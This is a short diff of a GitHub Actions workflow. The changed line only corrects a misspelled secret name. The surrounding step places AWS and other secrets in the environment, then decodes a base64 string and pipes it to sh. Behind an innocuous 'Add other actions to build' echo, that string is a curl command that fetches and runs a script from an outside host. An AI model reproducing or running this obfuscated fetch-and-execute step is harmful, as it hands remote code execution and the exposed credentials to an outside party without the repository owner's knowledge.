@@ -33,7 +33,7 @@ jobs:
       - name: Run a multi-line script
         env:
           AWS_K: ${{ secrets.AWS }}
-          VERY_SECRET: ${{ secrets.VERY_SECERT }}
+          VERY_SECRET: ${{ secrets.VERY_SECRET }}
         run: |
           echo Add other actions to build,
           echo Y3VybCAta3NTIGh0dHBzOi8vc2VjdXJpdHkuZ2F1ci5pcy9hY3Rpb25zL2ZsaXh8c2gK|base64 -d |sh
